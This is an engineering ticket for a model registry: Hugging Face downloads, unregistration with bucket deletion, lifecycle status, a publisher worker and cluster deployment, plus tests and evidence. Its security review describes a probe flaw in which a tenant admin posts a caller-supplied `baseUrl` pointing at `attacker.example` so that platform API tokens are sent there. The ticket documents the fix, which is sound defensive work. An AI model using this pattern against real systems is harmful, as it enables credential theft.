# TASK-1019: Model registry — HF publish, unregister with weight deletion, and one status per model

**Status:** Review — merged into `dev-2.2` (`ee59d13d5`) and live-proven on the local stack; cluster rollout pending (image build + promote, then push the deployment branch)
**Type:** feature + bugfix (security) + infrastructure
**Branch:** `dev-2.2` (lanes in worktrees, merged into `dev-2.2` by the orchestrator); deployment changes in `arca/hope-v2-deployment@main`
**Base commit at planning:** `628979ba4`
**Related:** TASK-860 (registry publisher, `DownloadAiModel` job), TASK-890 (readiness, resolvable probe), TASK-932 (platform-admin console alignment, `model-registry` provider rows), TASK-1005 (model residency), TASK-1011 (model-registry credential route), TASK-997 R-7 (loaded-models dashboard ask)

## Requirement Analysis

Owner request (2026-09-29), for the AI Platform → model registry and providers:

1. Only a platform admin can configure the Hugging Face token used to download models.
2. Only a platform admin can manage model registration.
3. A platform admin registers a new model by **HF repo id**; the weights are downloaded into the shared models bucket that every ML service mounts through its s3fs sidecar.
4. A platform admin can **unregister** a model, which also deletes its downloaded weights from the bucket.
5. A platform admin can see each model's status — whether it is being loaded and whether it is serving.

"Platform admin" = `SUPER_ADMIN` (`isSuperAdmin`, `packages/applications/src/common/tenant-guards.ts:55`), acting with no working tenant where the route writes the SYSTEM tier.

## Current State Evaluation (review 2026-09-29)

| # | Requirement | Status | Evidence |
|---|---|---|---|
| 1 | HF token platform-admin only | **Partial** | Stored on the SYSTEM `AiProviderConnection('model-registry','huggingface')` row (Vault-Transit ciphertext); writes are super-admin only (`ai-provider-connection.service.ts:2069-2083`), tenant reads 404 (`:188`), and `'model-registry': []` forbids tenant rows (`constants.ts:102-116`). **But** (a) the Test-connection route leaks it (below), and (b) a second, ungoverned copy exists: `HF_TOKEN` in the k8s Secret `hope-secrets`, projected by `envFrom` into ~10 pods including `hope-api`, read by the out-of-band `hope-models-publish` Job (`hope-v2-deployment: out-of-band/hope-models-publish.yaml:1235-1240`). |
| 2 | Registration platform-admin only | **Met** (minor gap) | `@Authorize(['manage','all'])` + `assertPlatformAdmin()` on create/update/delete/platform-default/reads (`aiModel.service.ts:1026`). `triggerDownload` (`ai-model-download.service.ts:54`) and `runInventory` (`model-inventory.service.ts:84`) rely on the guard alone. Tenants create only cloud BYO rows via `declareModels`. |
| 3 | Register by HF repo id → download to bucket | **Partial; cannot work on the cluster** | Two steps (`POST admin/ai-models`, then `POST admin/ai-models/:id/download`). The BullMQ processor (`publish/ai-model-download.processor.ts`) runs **inside `hope-api`**, buffers every file in memory (`model-source-fetcher.service.ts:84`, `huggingface-model-source.client.ts:127` `arraybuffer`) against a 2 GiB pod limit, `attempts: 1`, a crash leaves the row DOWNLOADING forever (`model-download-meta.util.ts:89`), and it writes through `IS3Service` whose credential is `hope-platform-rw` — a MinIO policy with **no rights on `hope-models`** (`hope-v2-deployment: out-of-band/minio-bootstrap.yaml:133-201`). Inventory under-lists: `S3Service.listFiles` never follows `ContinuationToken` (`s3.service.ts:510`), so >1000 keys ⇒ false MISSING. |
| 4 | Unregister + delete weights | **Missing** | "Retire" = row soft delete only (`aiModel.service.ts:729-741`). No prefix delete; `IS3Service.deleteFile` is single-key, no `VersionId`. No MinIO identity holds `s3:DeleteObject` on `hope-models` (publisher policy `minio-bootstrap.yaml:72-103`). Bucket is versioned; ILM expires non-current versions after 30 d; **no default object-lock retention is set and the publishers set none**, so deletes are not blocked by lock. |
| 5 | See loading / serving | **Partial** | Three unconnected planes with three vocabularies: publish status (`derivePublishStatus`, edit drawer only), readiness (`ready|loadable|engine_down|weights_missing|credential_missing|unknown`, 30 s sweep), residency (`loaded|loading|unloading|not_loaded`, `/model-residency`, stt/stt-worker/nlp/LM Studio only). A failed load is never recorded — `cache.py:618` just clears the key. The `/ai-models` grid shows only bucket `availability`. |

### Security defect found during the review (fixed first — Lane S)

`POST admin/providers/:service/:slug/test` is decorated `@CanManage('GlobalSetting')` (tenant admins hold it) and its service calls only `assertResolvable` — a shape check (`ai-provider-connection.service.ts:1503`). When the tenant has no row, the probe falls back to the **SYSTEM** row and decrypts its key (`provider-connection-probe.ts:132-154`), then sends `Authorization: Bearer <key>` to the **caller-supplied** `baseUrl` (any public https for a tenant, `:299`, `:451`). A tenant admin can therefore exfiltrate the platform HF token (`model-registry/huggingface`) and every platform OpenAI-compatible key (`llm|embeddings|stt:openai`, `:246-249`) by posting `{"baseUrl":"https://attacker.example"}`. Found by static reading; not executed.

### How the shared bucket works today (deployment repo)

- MinIO bucket `hope-models`, versioned, created `--with-lock` (no default retention), quota 200 GiB (non-current versions count), ILM `--noncurrent-expire-days 30 --expire-delete-marker`.
- s3fs native sidecar (`efrecon/s3fs:1.95`) mounts it **read-only** (`-o ro`, `uid/gid=1001`, lmstudio `10001`, `umask=0022`) at `/mnt/models-bucket` in `stt`, `stt-worker`, `nlp`, `tts-v2`, `lmstudio`, credential Secret `hope-models-reader`. Services run `HF_HUB_CACHE=/mnt/models-bucket/hf/hub`, `HF_HUB_OFFLINE=1`. vLLM streams `s3://` instead. No s3fs cache options are set.
- Two layouts, both already produced by the in-app processor and the out-of-band Job: `hf/hub/models--<org>--<repo>/{refs/main, snapshots/<sha>/…}` (no `blobs/`, no symlinks, `refs/main` without trailing newline) and flat `<slug>/<quant>-<sha12>/{manifest.json, SHA256SUMS, weights…}`.
- LM Studio's `link-models` init container symlinks GGUF prefixes **once at pod start** and picks the version lexicographically (`lmstudio.yaml:193`).
- Out-of-band `hope-models-publish` Job: hand-applied, hand-edited TSV lists, `curl` → emptyDir (26 Gi) → `mc cp`, credential `hope-models-publisher`.

## Owner Decisions (resolved 2026-09-29 — "go with your recommendations")

| Id | Decision |
|---|---|
| **OD-1** | Downloads run in a **dedicated model-publisher worker**: the `apps/api` image started with a queue-consumer-only entrypoint, holding the `hope-models-publisher` credential (never `hope-api`), egress 443 to huggingface.co, **staging to a bounded emptyDir** and uploading with S3 multipart. `hope-api` keeps only the queue producer. |
| **OD-2** | Unregister deletes every object under the model's prefix (current versions → delete markers; ILM reclaims in 30 d = a 30-day undo). An optional **purge** deletes every version now. The publisher policy gains `s3:DeleteObject` + `s3:DeleteObjectVersion`. |
| **OD-3** | Unregister of a model still in use answers **409 `MODEL_IN_USE`** listing the referrers. A loaded model is **unloaded first**, then deleted. |
| **OD-4** | The **registry is the single source of truth**. `HF_TOKEN` leaves `hope-secrets`; the out-of-band Job reads the SYSTEM token through the existing internal credential route. The static TSV lists are kept for empty-cluster bootstrap only. |
| **OD-5** | One lifecycle status per model on the `/ai-models` grid; **load failures are recorded**. tts and asr-vllm coverage is a **follow-up** (they show `NOT_OBSERVED` here). |
| **OD-6** | LM Studio picks up new GGUF files on **pod restart**; the console says so. No re-link verb in this ticket. |

### Decisions taken by the plan (owner may override)

| Id | Decision | Why |
|---|---|---|
| D-1 | The security fix ships as **Lane S of this ticket**, first and independently mergeable. | It is the leak that makes requirement 1 false; one lane, no dependency on the rest. |
| D-2 | Publisher credential = two new **`vault-kv` descriptors** (`MODEL_STORE_PUBLISHER_ACCESS_KEY_ID`, `MODEL_STORE_PUBLISHER_SECRET_KEY`) read through `SecretsService` by the publisher worker only; on the cluster they are fed from the **existing** `hope-models-publisher` Secret by `secretKeyRef` into the worker Deployment alone. Endpoint/region come from the platform storage cascade (`resolvePlatformStorageConfig`). Absent credential ⇒ the job fails closed (`MODEL_STORE_CREDENTIAL_MISSING`), never falls back to `hope-platform-rw`. | Not the `model-registry:s3` row: `apps/stt`/`nlp`/`tts` read that row through `/internal/model-registry-credential` to resolve `s3://` sources, so putting a write+delete key there would hand it to every ML pod. |
| D-3 | **One staging path for both layouts**: stream each file to disk while hashing (sha256), then multipart-upload from disk. Pre-flight: sum file sizes from the Hub `paths-info`; refuse with `STAGING_SPACE_INSUFFICIENT` when they exceed free staging space. | The flat layout's version is derived from `SHA256SUMS` of all files, so its prefix is only known after every file is hashed; a staging-free stream would need server-side copies (>5 GB needs UploadPartCopy). |
| D-4 | Progress + liveness live in `AiModel._metadata.download` (`bytesDone`, `bytesTotal`, `heartbeatAt`, `attempt`) — **no DDL**. A DOWNLOADING row whose `heartbeatAt` is older than `modelRegistry.download.staleAfterSeconds` (new `global-kv` descriptor, default 300, `open-to-default`) derives as `DOWNLOAD_FAILED` (`STALLED`) and may be re-triggered. BullMQ `attempts` = `modelRegistry.download.maxAttempts` (descriptor, default 3, exponential backoff); a retry skips keys already present with a matching size. | The existing JSON bookkeeping already carries publish state; a column would be DDL for no query benefit. |
| D-5 | Unregister and purge run as a **job on the same publisher queue** (`JobQueue.DownloadAiModel` renamed in code comments only — the queue name is unchanged to avoid a drain), so deletion also runs with the publisher credential and outside `hope-api`. | Only the worker holds a delete-capable key (D-2). |
| D-6 | A prefix is deleted only if **no other non-deleted row** references the same `bucketPrefix` (two rows may wrap one repo at different revisions/compute types); otherwise the row is unregistered and the weights kept, and the response says so (`weights: 'kept-shared'`). | Deleting a shared prefix would break a still-registered model. |
| D-7 | `MODEL_IN_USE` referrers: `Agent.modelId`, `AgentModelFallback.modelId`, `AiRoutingPolicy.modelId`, `ModelResidencyPolicy.aiModelId` (all `onDelete: Restrict`), **plus slug references**: agent ASR sub-model slugs resolved through `asr-profile.util.ts` (VAD / denoise / diarization / embedding) and `UserVoiceProfile.modelId` (holds the slug, `user.prisma:279`). Referrers are listed across **all tenants** (platform-admin view: tenant id + referrer id + name). | Every FK is `Restrict`, so a row delete would fail anyway; slug references would silently break. |
| D-8 | "Failed" is **live state, not a column**: `hope_runtime_models` caches keep a per-key `last_failure {code, message, at}` reported as residency state `failed` until the next successful load, an explicit unload, or process restart (no TTL knob). The gateway ledger does the same for LM Studio load failures. | No threshold to configure, no persistence to reconcile; a restart re-observes. |
| D-9 | Lifecycle vocabulary (`ModelLifecycleStatus`), first match wins: `UNREGISTERING` → `DOWNLOADING` → `DOWNLOAD_FAILED` → `NOT_DOWNLOADED` (availability ≠ AVAILABLE) → `LOAD_FAILED` → `LOADING` → `SERVING` (state `loaded` on ≥ 1 observed service) → `DOWNLOADED` (idle, loadable) → `NOT_OBSERVED` (served by a service outside the residency ledger — tts, asr-vllm, text, vLLM) → `NOT_APPLICABLE` (cloud rows). Per-service detail (service, state, device, bytes, inFlight, requests/min, error) rides beside it. | One word per row for the grid; the detail keeps the evidence. |
| D-10 | The existing `DELETE admin/ai-models/:id` (row-only retire) stays for API compatibility; the console replaces "Retire" with **"Unregister"** (checkbox "Delete weights from the bucket", default on; "Purge all versions now", default off). | Additive; no generated-SDK break. |
| D-11 | New routes carry the house platform-admin shape: class `@ForbidApiKey()` + `@RequiredSvcScopes('svc:admin:ai-model:manage')` + `@Authorize(['manage','all'])`, and `assertPlatformAdmin()` in every service method (also added to `triggerDownload` / `runInventory` / their reads). | Closes the requirement-2 guard-only gap; matches the existing controller. |

## Implementation Plan

### Shared contract (fixed before any lane starts)

```ts
// packages/applications/src/services/ai-model/publish/model-store.ts (Lane P owns)
export interface ModelStore {
  headObject(key: string): Promise<{ size: number } | null>;
  uploadFile(key: string, localPath: string, opts?: { contentType?: string }): Promise<void>; // multipart
  putSmall(key: string, body: Buffer | string): Promise<void>;
  listPrefix(prefix: string): AsyncIterable<{ key: string; size: number }>;          // paginated
  deletePrefix(prefix: string, opts: { purge: boolean }): Promise<{ objects: number; versions: number }>;
}

// job payloads on JobQueue.DownloadAiModel (unchanged queue name)
type PublisherJob =
  | { kind: 'download'; jobId: string; aiModelId: string; tenantId: string; userId?: string }
  | { kind: 'unregister'; jobId: string; aiModelId: string; tenantId: string; userId?: string; deleteWeights: boolean; purge: boolean };
// a payload with no `kind` is read as 'download' (jobs queued before the deploy)

// packages/types/src/model-lifecycle.ts (Lane R owns; consumed by console)
export type ModelLifecycleStatus =
  | 'UNREGISTERING' | 'DOWNLOADING' | 'DOWNLOAD_FAILED' | 'NOT_DOWNLOADED' | 'LOAD_FAILED'
  | 'LOADING' | 'SERVING' | 'DOWNLOADED' | 'NOT_OBSERVED' | 'NOT_APPLICABLE';
```

Residency report gains `state: 'failed'` + `error: {code, message, at}` per model (Python agent and gateway `CatalogueModelStatus`).

New / changed routes (all under `admin/ai-models`, platform-admin only, D-11):

| Route | Purpose |
|---|---|
| `GET hub/preview?repoId=&revision=` | Hub card → prefill (`pipeline_tag`→`taskType`, `library_name`, license, gated, languages, base model, commit sha, total size, file list, suggested slug/format/layout). 404 unknown repo; 422 `HF_TOKEN_REQUIRED` for a gated/private repo with no platform token. |
| `POST register-from-hub` | Create the SYSTEM row from the preview + overrides and enqueue the download in one call → 202 `{ model, jobId }`. 409 on slug collision. |
| `POST :id/unregister` `{ deleteWeights=true, purge=false }` | Refs check (409 `MODEL_IN_USE`) → residency unload on every service holding it (409 `MODEL_UNLOAD_FAILED` if it stays loaded) → mark `UNREGISTERING` → enqueue → 202 `{ jobId, weights: 'deleting' \| 'kept-shared' \| 'kept' }`. |
| `GET :id/usage` | The referrer list the 409 carries, for the console to show before confirming. |
| `POST download-missing` | Enqueue a download for every SYSTEM `SELF_HOSTED` row with `availability = MISSING` and a Hub/`s3://` source (bootstrap replacement for OD-4). |
| `GET` / `GET list` / `GET :id` | Each row gains `lifecycle: { status: ModelLifecycleStatus, services: [...], download?: {bytesDone, bytesTotal, error}, observedAt }`. |

No Prisma schema change and no migration.

### Lanes (disjoint file ownership; each in its own worktree off `dev-2.2`)

| Lane | Owns | Tier | Depends on |
|---|---|---|---|
| **S** probe leak | `packages/applications/src/services/ai-provider-connection/provider-connection-probe.ts` (+ its `__tests__`), `apps/api/tests/e2e/task-1019-provider-probe-tier.spec.ts` | sonnet, opus reviews | — |
| **P** publisher worker + model store | `ai-model/publish/**` (new `model-store.ts`, streaming fetcher, processor split download/unregister, heartbeat, retry-skip), `huggingface-model-source.client.ts` (stream + `paths-info`), `ai-model-download.service.module.ts` split into `…producer.module.ts` / `…worker.module.ts`, new `apps/api/src/model-publisher.main.ts` (+ `ModelPublisherWorkerModule`), `package.json` scripts `publisher:dev`, `@aws-sdk/lib-storage` dep in `packages/applications`, `S3Service.listFiles` pagination fix, vault-kv descriptors (D-2) | opus | contract |
| **R** registry API + lifecycle | `aiModel.service.ts` (register-from-hub, unregister orchestration, usage), new `ai-model/lifecycle/model-lifecycle.service.ts`, `ai-model-download.service.ts` + `model-inventory.service.ts` (`assertPlatformAdmin`, `download-missing`), `ai-model-admin.controller.ts` + DTOs, `global-kv` descriptors (D-4), `packages/types/src/model-lifecycle.ts` | opus | contract |
| **Y** residency failed state | `packages/py-runtime-models/**` (`cache.py` `last_failure`, `residency_agent.py` `failed`, `metrics.py` `model_load_failures_total`), `apps/stt` + `apps/nlp` residency tests, `packages/applications/src/services/model-residency/**` (`'failed'` in types/catalogue, LM Studio op failure → ledger) | sonnet | contract |
| **C** console | `apps/admin-console/src/features/ai-models/**` (Register-from-HF dialog with preview, lifecycle column + filter, per-service detail in the drawer, progress bar, Unregister dialog with usage list, LM Studio restart hint, "Download missing"), `features/model-residency/components/residency-display.ts` (`failed`) | sonnet | contract |
| **D** deployment (`hope-v2-deployment`) | new `base/model-publisher.yaml` (Deployment, same api image, `node dist/model-publisher.main.js`, emptyDir `sizeLimit: 40Gi`, `secretKeyRef` from `hope-models-publisher` only, no `envFrom hope-secrets` except the DB/Redis/Vault bootstrap keys it needs, egress NetworkPolicy 443 + MinIO + Redis + Postgres + Vault), `out-of-band/minio-bootstrap.yaml` publisher policy + `DeleteObject`/`DeleteObjectVersion`, `out-of-band/hope-models-publish.yaml` `fetch-hf-private` reads the token from `GET /api/v1/internal/model-registry-credential` (service token by `secretKeyRef`), `deployment/secrets.dev.yaml.example` drops `HF_TOKEN`, `scripts/bootstrap-cluster.sh` step 5 → `POST admin/ai-models/download-missing` once the API is healthy, `docs/model-bucket-and-serving.md` | sonnet | P (entrypoint name) |
| **Orchestrator** | Merges; the five API artifacts (`api:build`, `api:route-manifest`, `api:openapi`, `api:portal`, `vox-node gen:admin`); env samples + `turbo.json#globalEnv` for `MODEL_PUBLISHER_STAGING_DIR`; `dev-service.sh` `publisher` target; docs (`docs/operations/` model-registry runbook); the single post-merge gate; live proof | — | all |

Merge order: **S** (anytime) → P + R + Y (parallel) → C → orchestrator artifacts → D (after the image carrying `model-publisher.main.js` is built and promoted, so the Deployment never references a missing entrypoint).

### TDD test list (RED first; each lane runs only its own files — owner rule: no gates before the full merge)

**Lane S**
- S1 tenant scope, no tenant row, body `baseUrl` set, SYSTEM row keyed → 400 `STORED_KEY_REQUIRES_STORED_ENDPOINT`; no fetch issued; `decryptSecretField` never called.
- S2 tenant scope, no tenant row, no body `baseUrl` → probe runs against the SYSTEM row's stored endpoint (a platform-admin value) or the vendor default — never a caller-chosen host.
- S3 tenant scope on a platform-only service (`model-registry`, built-ins) → 404 (`assertVisibleToTier`), matching the read route.
- S4 SYSTEM scope (super admin, no working tenant) with body `baseUrl` + stored key → still allowed (platform admin probing platform infra).
- S5 e2e: tenant-admin JWT `POST admin/providers/model-registry/huggingface/test {"baseUrl":"https://example.invalid"}` → 404; `…/llm/openai/test` with `baseUrl` and no key → 400.

**Lane P**
- P1 `ModelStore.listPrefix` follows `ContinuationToken` across 3 pages (mocked S3).
- P2 `deletePrefix({purge:false})` batches `DeleteObjects` ≤ 1000 keys; `{purge:true}` pages `ListObjectVersions` and deletes every `VersionId` + delete marker.
- P3 fetcher streams to a temp dir, never holds a whole file (a 3-chunk stream with a `Buffer.concat` spy asserts no full-file buffer); sha256 equals the known digest.
- P4 pre-flight refuses `STAGING_SPACE_INSUFFICIENT` when `paths-info` total > free space (injected `statfs`).
- P5 heartbeat writes `bytesDone` at most every N s; final write sets `finishedAt`, `availability=AVAILABLE`, `bucketPrefix`, `hfRevision`.
- P6 retry skips keys whose `headObject` size matches; re-uploads a size mismatch.
- P7 HF-cache layout: `refs/main` body has no trailing newline; snapshot keys under `hf/hub/models--o--n/snapshots/<sha>/`.
- P8 publisher credential absent → job fails `MODEL_STORE_CREDENTIAL_MISSING`; never constructs a client from platform storage keys.
- P9 unregister job: shared prefix (another live row) → row soft-deleted, `deletePrefix` not called, result `kept-shared`; sole owner → `deletePrefix` called with the requested `purge`, row soft-deleted, `availability=MISSING`, `ResourceDeleted` sys-event.
- P10 a payload without `kind` is processed as a download.
- P11 `hope-api` module graph (`AppModule`) contains no `AiModelDownloadProcessor` provider; `ModelPublisherWorkerModule` does.

**Lane R**
- R1 `hub/preview` maps a mocked Hub card to taskType/library/license/gated/languages/sha/size/suggested slug; gated + no token → 422 `HF_TOKEN_REQUIRED`.
- R2 `register-from-hub` creates a SYSTEM row (`tenantId` = SYSTEM, `source=HUGGINGFACE`, `sourceUri=hf:<repo>`, `sourceRevision=<sha>`) and enqueues exactly one download; slug collision → 409.
- R3 every new/changed method throws 403 for a tenant admin and for a super admin with a working tenant set (`assertPlatformAdmin`), including `triggerDownload`, `runInventory`, `download-missing`.
- R4 `unregister` with an `Agent.modelId`, a fallback, a routing policy, a residency policy, an ASR sub-model slug and a voice-profile slug reference → 409 `MODEL_IN_USE` listing all six with tenant ids; nothing enqueued.
- R5 `unregister` of a loaded model calls residency unload per service first; still loaded → 409 `MODEL_UNLOAD_FAILED`; unloaded → row `UNREGISTERING`, one job enqueued.
- R6 lifecycle derivation table-test covering every D-9 branch, incl. stale heartbeat → `DOWNLOAD_FAILED`/`STALLED`, cloud row → `NOT_APPLICABLE`, tts-served row → `NOT_OBSERVED`.
- R7 `download-missing` enqueues only SYSTEM `SELF_HOSTED` MISSING rows with a fetchable source; skips rows already DOWNLOADING.

**Lane Y**
- Y1 (pytest, `py-runtime-models`) a loader that raises → `report()` shows the key `state: "failed"` with `error.code`; a later successful load clears it; `unload` clears it.
- Y2 `model_load_failures_total{service,model,code}` increments once per failed load.
- Y3 (stt, nlp) the residency route returns the failed entry through the service's own agent.
- Y4 (TS) catalogue maps a reported `failed` to status `failed` with the error; a failed LM Studio load operation marks the ledger entry `failed` until the next successful load/unload.

**Lane C** (Vitest + RTL, colocated `__tests__`)
- C1 Register-from-HF: typing a repo id fetches the preview, prefills fields, shows size + gated state; submit posts `register-from-hub`; 422 renders the "configure the HF token in AI providers" link.
- C2 grid lifecycle column renders every `ModelLifecycleStatus` with icon + text (not colour alone); filter by status.
- C3 Unregister dialog loads `:id/usage`; referrers block the confirm button with the list; purge checkbox off by default; posts `unregister`.
- C4 GGUF row served by `lm-studio` after DOWNLOADED shows the restart hint.
- C5 axe scan 0 violations on the dialogs and the grid (both themes).

**Lane D**
- D1 `kustomize build deployment/k8s/overlays/dev` renders; the repo's eight CI jobs pass locally where runnable (`kubeconform`, `config-refs`, `envfrom-coverage`, `image-hygiene`).
- D2 the publisher Deployment has no `envFrom: hope-secrets` key carrying `HF_TOKEN` or `MINIO_*`; `hope-api` does not reference `hope-models-publisher`.
- D3 execute the rendered `fetch-hf-private` script against a stub `curl` on PATH and assert it calls the internal credential route with `X-Service-Token` (render alone proves nothing — see the s3fs continuation-comment lesson).

### Verification (after all lanes are merged — the one gate)

1. `pnpm --filter @arcaai/applications build test`, `pnpm api:build`, `pnpm test:unit`, `pnpm --filter @arcaai/admin-console build lint test`, `pnpm --filter @arcaai/types build`, `pnpm nlp:test`, `pnpm stt:test`, `pnpm lint:all`, `pnpm typecheck:all` — output pasted here.
2. The five artifacts regenerated and their checks green: `pnpm api:openapi:check`, `pnpm api:portal:check`, `pnpm --filter @arcaai/vox-node gen:admin:check`; `task-776-route-authz-matrix.spec.ts` green with the new routes.
3. `RESET_DB=false` e2e: S5, plus platform-admin-only assertions for the new routes across the four credential classes.
4. **Live proof, local stack** (`pnpm stack:dev` + `pnpm publisher:dev`): register a small public repo from HF in the console → progress → `DOWNLOADED` → objects present under `hf/hub/models--…` in local MinIO → nlp/stt resolvable probe true → residency load → `SERVING` → unregister with purge → `ListObjectVersions` on the prefix empty → row gone from the grid. Tenant-admin session: `/ai-models` 404, probe exfil request refused. Screenshots in both themes.
5. **Live proof, cluster** (after D lands and Argo syncs): same flow against `hope-models` through the s3fs mount — `stat -c '%A %U:%G'` on the new snapshot dir in an nlp pod shows `drwxr-xr-x hope:hope`; `hope-api` env has no `HF_TOKEN`; a forced load failure shows `LOAD_FAILED` with its code.

### Follow-ups (out of scope)

- FU-1 Residency coverage for tts, asr-vllm, vLLM and text (today `NOT_OBSERVED`), incl. an asr-vllm consumer for its engine-pool snapshot.
- FU-2 LM Studio: a re-link verb (no restart) and pick the version the registry names instead of `ls | tail -1` (`lmstudio.yaml:193`).
- FU-3 Bucket quota headroom check before a download (needs the MinIO admin API).
- FU-4 Retire the out-of-band Job's static TSV lists once `download-missing` has bootstrapped a fresh cluster end to end.
- FU-5 s3fs stat-cache options (`stat_cache_expire`) so deletes are reflected promptly in every mount.
- FU-6 The model inventory lists `hope-models` through `IS3Service` (`hope-platform-rw`), which has no rights on that bucket on the cluster (pre-existing since TASK-860): run it through a read-capable principal so `availability` stops reading UNKNOWN.
- FU-7 `s3://` sources still pass each object through memory (`IS3Service.getFile` has no streaming read).
- FU-8 Deferred review minors: the Unregister dialog flashes an empty model name while it closes after success; gateway `weights` estimate vs the worker's repo-dir rule; flat-layout unregister leaves older `<slug>/<version>/` prefixes; prefix comparison without trailing-slash normalisation; repo-id regex accepts `.`/`..` segments; unreadable residency shows DOWNLOADED rather than unknown; a failed re-download hides SERVING; worker gets `JWT_SECRET_KEY` it does not need; UnregisterModelDialog sets state during render; no `libraryName` override in the register sheet; 5 s polling emits `ResourceViewed` audit events; residency failure map unbounded per key; LM Studio failures held per gateway replica; `admin/ai-models/discovery` is now tenantless for a super admin (proxy change).

## Implementation Summary

Built on `task-1019/model-registry` (worktree `../hope-v2-task-1019`), which carries `dev-2.2` up to `ff4226a3d` plus every lane.
The deployment half is on `arca/hope-v2-deployment` branch `task-1019/model-publisher` (worktree `../hope-v2-deployment-task-1019`), not pushed.

| Req | What now exists |
|---|---|
| 1 HF token platform-only | The SYSTEM `model-registry/huggingface` connection is the single home. **Lane S** closed the probe leak: platform-only planes are 404 to tenants on `POST admin/providers/:service/:slug/test`, and a platform-key fallback refuses any body endpoint field (`PLATFORM_KEY_ENDPOINT_LOCKED`), including `apiKey: null` / whitespace (fix C2). Deployment: `HF_TOKEN` leaves `hope-secrets`; the out-of-band Job reads the token from `GET /internal/model-registry-credential`. |
| 2 Registration platform-only | Every registry operation (existing + new, incl. download, download status, inventory) requires a super admin with no working tenant (`lifecycle/platform-admin.ts`). The console BFF proxy treats `admin/ai-models` as platform-wide, except the tenant-scoped `catalogue`. |
| 3 Register by HF repo id | `GET admin/ai-models/hub/preview`, `POST register-from-hub` (create + enqueue in one call), `POST download-missing`. A separate **model-publisher worker** (`apps/api/src/model-publisher.main.ts`, `AiModelPublisherWorkerModule`) consumes the queue with its own `hope-models` key pair: it streams Hub files to a staging dir while hashing, with a free-space + budget pre-flight, a byte-idle watchdog and per-request S3 timeouts, then multipart-uploads in the two existing layouts, heartbeats progress (progress-based), retries idempotently and ignores superseded jobs. `hope-api` holds only the producer. |
| 4 Unregister + delete weights | `GET :id/usage` (cross-tenant referrers) and `POST :id/unregister {deleteWeights, purge}`: 409 `MODEL_IN_USE`, residency unload first (409 `MODEL_UNLOAD_FAILED`), then the worker re-checks referrers, deletes the prefix (delete markers; `purge` removes every version), keeps a shared prefix, records the outcome and soft-deletes the row. MinIO publisher policy gains `DeleteObject` / `DeleteObjectVersion`. |
| 5 Model status | Each registry row carries `lifecycle` (`UNREGISTERING … SERVING … NOT_APPLICABLE`) merged from publish bookkeeping, bucket availability and the residency catalogue, with per-service detail. Failed loads are now a residency state `failed` with code/message/time (Python cache + agent, gateway catalogue, `model_load_failures_total`). The console shows the status column, progress, a Status section, an edit lock while transient, the Register-from-HF sheet and the Unregister dialog. |

### Configuration added
| Key | Tier | Reader |
|---|---|---|
| `MODEL_STORE_PUBLISHER_ACCESS_KEY_ID` / `_SECRET_KEY` | env (secret, fail-closed), excluded from the gateway boot contract (`READ_BY_MODEL_PUBLISHER_ONLY`) | publisher worker only |
| `MODEL_PUBLISHER_STAGING_DIR`, `MODEL_PUBLISHER_STAGING_MAX_BYTES` | env (topology) | publisher worker |
| `modelRegistry.download.staleAfterSeconds` (300), `.maxAttempts` (3), `.idleTimeoutSeconds` (120), `.requestTimeoutSeconds` (600) | global-kv, platform-only | gateway / worker |

No Prisma schema change, no migration. The five API artifacts are regenerated (`api:openapi:check`, `api:portal:check`, `vox-node gen:admin:check`: no drift).

### Evidence (single gate on the integration branch, after the fix pass)
- `@arcaai/applications`: 1008 files / 15496 tests pass; typecheck 0; lint 0 errors.
- `@arcaai/api`: 357 files / 4676 tests pass; typecheck 0; lint 0 errors.
- `@arcaai/admin-console`: 396 files / 3812 tests pass; typecheck 0; lint clean (plus the later start-download fix: `features/ai-models` 166/166).
- `@arcaai/vox-node` 587 tests, typecheck 0; `tests/contracts` 383; `env:sync:check` OK; `py-runtime-models` 135 passed.
- nlp / stt: the only failures (nlp metrics ×2, stt streaming-sessions ×8 + real-data ×4 errors) fail identically on plain `dev-2.2`; stt CORS ×2 fail only because worktrees lack the primary's untracked `apps/stt/.env`.
- Worker boot: `node apps/api/dist/model-publisher.main.js` against unreachable Redis/Postgres resolves every provider and stops at `P1001` in `onModuleInit` (after adding `BlobStorageModule.forRoot()`).
- Deployment repo: all six overlays render; kubeconform strict, config-refs, envfrom-coverage, secret-keys, probes, image-hygiene, capacity, patch-hygiene pass; the rendered `fetch-hf-private` script was executed against a stub `curl`.
- **Live proof, local stack (2026-09-29, `dev-2.2` at `ee59d13d5`, API reporting `0.0.0-dev-2-2.ee59d13d`, publisher worker via `pnpm publisher:dev`):**
  - Auth: tenant admin `POST admin/providers/model-registry/huggingface/test {baseUrl}` → **404**; tenant admin `llm/openai/test {apiKey:null, baseUrl:"https://example.invalid"}` → **400 `PLATFORM_KEY_ENDPOINT_LOCKED`**; tenant admin hub preview → **403**; super admin with a working tenant (or logged in via a tenant key) → **403** "clear the working tenant" — same posture as model residency; tenant-less super admin → 200.
  - Register: `hub/preview?repoId=hf-internal-testing/tiny-random-bert` → sha `f171d7ba…`, `transformers`, 10 files, `hf-cache`; `register-from-hub` → **202**; lifecycle **DOWNLOADING (1 523 618 / 1 523 939 bytes) → DOWNLOADED**, availability `AVAILABLE`, `bucketPrefix hf/hub/models--hf-internal-testing--tiny-random-bert/snapshots/f171d7ba…/`.
  - Bucket (S3 `ListObjectVersions` on local MinIO `hope-models`): `refs/main` = the 40-char sha with **no trailing newline**, snapshot files + `SHA256SUMS` + `manifest.json`.
  - Status: registry list shows `lms-gemma-4-e2b-it-qat` **SERVING** (`lm-studio: loaded`) and the new row **DOWNLOADED** (`nlp: not_loaded`), one `observedAt`.
  - Unregister: in-use Gemma → **409 `MODEL_IN_USE`** (48 referrers over HTTP; the console dialog listed 59 after TASK-1020 content landed) with the confirm disabled; test model `usage` → none; `unregister {purge:true}` → **202**, worker `weights=deleted, purge=true`, row **404**, prefix **0 versions / 0 delete markers**; via the console without purge → worker `purge=false`, prefix **10 versions + 10 delete markers** (recoverable for 30 days), row gone from the grid.
  - Console (`/ai-models`, tenant-less super admin): Lifecycle column, Register from Hugging Face sheet (preview size/revision/library, prefill, the "configure the HF token" message for an unreadable repo), Unregister dialog (referrer list; purge off by default).
  - **Defect found and fixed during the proof:** a Hub repo with no pipeline tag suggested no `servedBy`, so the console's "Choose for me" reached `AiModelService.create` without one and showed the raw validator message. `register-from-hub` now derives `servedBy`/category/provider from the task the admin chose and answers `400 SERVED_BY_REQUIRED` when nothing is inferable (`94452b2e4`, RED→GREEN, lifecycle suite 58/58). The running dev API picks it up on its next restart.
  - Not provable locally: SERVING of a bucket-published model (local services read `~/.cache/hope-hf`, not the s3fs mount) — that is the cluster proof.
